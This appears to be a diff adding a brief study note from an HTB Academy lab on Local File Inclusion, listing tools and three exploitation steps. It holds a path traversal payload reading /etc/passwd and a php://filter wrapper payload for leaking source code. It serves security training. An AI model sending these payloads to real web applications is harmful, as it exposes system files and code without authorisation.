@@ -1,0 +1,26 @@
+🛡️ HTB Academy - Local File Inclusion (LFI)
+
+📅 Completed: July 2025 -
+
+---
+
+Objective
+Understand Local File Inclusion attack vectors and parameter exploitation in web applications.
+
+---
+🛠 Tools:
+- Browser
+- Burp Suite
+- curl
+
+---
+
+🔍 Exploitation Steps
+1. Access the vulnerable endpoint:
+`http://target/?page=...`
+
+2. Try the payload:
+?page=../../../../etc/passwd
+
+3. Use `php://filter` to bypass:
+?page=php://filter/convert.base64-encode/resource=index
